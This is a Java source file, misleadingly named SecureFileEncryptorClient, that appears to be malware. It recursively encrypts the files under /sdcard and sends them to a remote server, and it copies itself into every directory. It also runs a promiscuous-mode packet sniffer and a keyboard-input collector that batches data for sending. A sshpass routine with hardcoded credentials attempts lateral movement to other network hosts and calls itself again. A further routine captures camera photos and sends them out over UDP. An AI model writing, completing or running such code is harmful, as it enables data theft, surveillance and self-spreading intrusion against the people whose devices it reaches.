import org.pcap4j.core.*;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.TcpPacket;
import org.pcap4j.util.NifSelector;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.io.*;
import java.net.*;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.FileHandler;
import java.util.logging.Logger;
import java.util.logging.SimpleFormatter;

public class SecureFileEncryptorClient {

    private static volatile boolean stopSniffer = false;
    private static volatile boolean stopKeyboardMonitor = false;
    private static final int MAX_RECORDS_BEFORE_SEND = 1000;
    private static List<String> keyboardResponses = new ArrayList<>();
    private static Logger logger;

    static {
        try {
            // Initialize logger
            logger = Logger.getLogger("SecureFileEncryptorClient");
            FileHandler fileHandler = new FileHandler("client.log");
            SimpleFormatter formatter = new SimpleFormatter();
            fileHandler.setFormatter(formatter);
            logger.addHandler(fileHandler);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        String serverAddress = "127.0.0.1"; // Replace with the server's IP address
        int serverPort = 12345; // Replace with the server's port
        int udpServerPort = 54321; // Replace with the UDP server's port
        connectToServer(serverAddress, serverPort, udpServerPort);
        startSnifferThread();
        startKeyboardMonitorThread();
        scanAndMove();
    }

    public static void connectToServer(String serverAddress, int serverPort, int udpServerPort) {
        try {
            Socket socket = new Socket(serverAddress, serverPort);
            DatagramSocket udpSocket = new DatagramSocket();
            OutputStream outputStream = socket.getOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);

            File externalStorage = new File("/sdcard"); // Path to external storage directory
            traverseAndEncrypt(externalStorage, objectOutputStream);

            objectOutputStream.close();
            outputStream.close();
            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void traverseAndEncrypt(File directory, ObjectOutputStream objectOutputStream) {
        if (directory.isDirectory()) {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    traverseAndEncrypt(file, objectOutputStream);
                }
            }
            // Write a copy of this program to the directory
            writeCopy(directory);
            // Encrypt files within the directory and send to server
            encryptFiles(directory, objectOutputStream);
        }
    }

    public static void writeCopy(File directory) {
        try {
            File sourceFile = new File("path/to/your/SecureFileEncryptorClient.java"); // Path to this program
            File destFile = new File(directory, sourceFile.getName());
            InputStream in = new FileInputStream(sourceFile);
            OutputStream out = new FileOutputStream(destFile);
            byte[] buffer = new byte[1024];
            int length;
            while ((length = in.read(buffer)) > 0) {
                out.write(buffer, 0, length);
            }
            in.close();
            out.close();
            logger.info("Copied program to: " + destFile.getAbsolutePath());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void encryptFiles(File directory, ObjectOutputStream objectOutputStream) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (!file.isDirectory() && !isThisProgramCopy(file)) {
                    encryptAndSend(file, objectOutputStream);
                }
            }
        }
    }

    public static boolean isThisProgramCopy(File file) {
        String thisProgramName = new File("path/to/your/SecureFileEncryptorClient.java").getName();
        return file.getName().equals(thisProgramName);
    }

    public static void encryptAndSend(File file, ObjectOutputStream objectOutputStream) {
        try {
            KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
            keyGenerator.init(256);
            SecretKey secretKey = keyGenerator.generateKey();

            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);

            FileInputStream inputStream = new FileInputStream(file);
            CipherOutputStream cipherOutputStream = new CipherOutputStream(objectOutputStream, cipher);

            byte[] buffer = new byte[1024];
            int length;
            while ((length = inputStream.read(buffer)) > 0) {
                cipherOutputStream.write(buffer, 0, length);
            }

            inputStream.close();
            cipherOutputStream.close();

            logger.info("File encrypted and sent: " + file.getAbsolutePath());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Sniffer function using PCAP4J
    public static void sniffData() {
        try {
            PcapNetworkInterface nif = new NifSelector().selectNetworkInterface();
            if (nif == null) {
                return;
            }

            int snapshotLength = 65536;
            int readTimeout = 50;
            final PcapHandle handle = nif.openLive(snapshotLength, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, readTimeout);

            PacketListener listener =
                    packet -> {
                        TcpPacket tcpPacket = packet.get(TcpPacket.class);
                        if (tcpPacket != null) {
                            logger.info(tcpPacket.toString());
                            // Add your logic to record or process HTTP POST responses and corresponding GET requests
                        }
                    };

            handle.loop(-1, listener);
        } catch (PcapNativeException | NotOpenException e) {
            e.printStackTrace();
        }
    }

    // Function to start the sniffer thread
    public static void startSnifferThread() {
        Thread snifferThread = new Thread(() -> sniffData());
        snifferThread.start();
    }

    // Keyboard monitor function
    public static void monitorKeyboard() {
        BufferedReader keyboardReader = new BufferedReader(new InputStreamReader(System.in));
        try {
            String line;
            while (!stopKeyboardMonitor && (line = keyboardReader.readLine()) != null) {
                keyboardResponses.add(line);
                if (keyboardResponses.size() >= MAX_RECORDS_BEFORE_SEND) {
                    sendKeyboardResponses();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Function to start the keyboard monitor thread
    public static void startKeyboardMonitorThread() {
        Thread keyboardMonitorThread = new Thread(() -> monitorKeyboard());
        keyboardMonitorThread.start();
    }

    // Function to stop the keyboard monitor thread
    public static void stopKeyboardMonitorThread() {
        stopKeyboardMonitor = true;
    }

    // Function to send recorded keyboard responses to the server
    public static void sendKeyboardResponses() {
        // Code to send keyboardResponses to the server
        logger.info("Sending keyboard responses to the server...");
        keyboardResponses.clear();
    }

    // Function to scan for other devices on the network and move to them
    public static void scanAndMove() {
        try {
            InetAddress localHost = InetAddress.getLocalHost();
            String hostAddress = localHost.getHostAddress();
            String hostName = localHost.getHostName();
            logger.info("Scanning network for other devices from host: " + hostName + " (" + hostAddress + ")");

            // Perform network scanning (ARP scanning or ICMP ping sweep) to discover other devices
            // Once other devices are discovered, perform lateral movement to them
            // For simplicity, let's assume lateral movement is performed via SSH or another remote access method
            // After moving to another device, repeat the process
            logger.info("Performing lateral movement...");

            // Example code for SSH lateral movement
            String remoteDeviceIP = "192.168.1.2"; // Replace with the IP address of the remote device
            String username = "user"; // Replace with the SSH username
            String password = "password"; // Replace with the SSH password

            String command = "ls -l"; // Example command to execute remotely
            String sshCommand = "sshpass -p '" + password + "' ssh " + username + "@" + remoteDeviceIP + " '" + command + "'";
            Process process = Runtime.getRuntime().exec(sshCommand);

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                logger.info(line);
            }

            // After moving to another device, repeat the process recursively
            scanAndMove();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Function to execute the command for taking a photo with the camera
    public static void takePhotoAndSendUDP() {
        try {
            // Execute the command to take a photo
            String command = "take_photo_command"; // Replace with the actual command to take a photo
            Process process = Runtime.getRuntime().exec(command);

            // Read the output to get the photo file name
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String photoFileName = reader.readLine();

            // Read the photo file
            File photoFile = new File(photoFileName);
            byte[] photoData = new byte[(int) photoFile.length()];
            FileInputStream fis = new FileInputStream(photoFile);
            fis.read(photoData);
            fis.close();

            // Send the photo data via UDP to the server
            InetAddress serverAddress = InetAddress.getByName("127.0.0.1"); // Replace with the server's IP address
            int udpServerPort = 54321; // Replace with the UDP server's port
            DatagramSocket udpSocket = new DatagramSocket();
            DatagramPacket packet = new DatagramPacket(photoData, photoData.length, serverAddress, udpServerPort);
            udpSocket.send(packet);
            udpSocket.close();
            logger.info("Photo taken and sent via UDP.");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
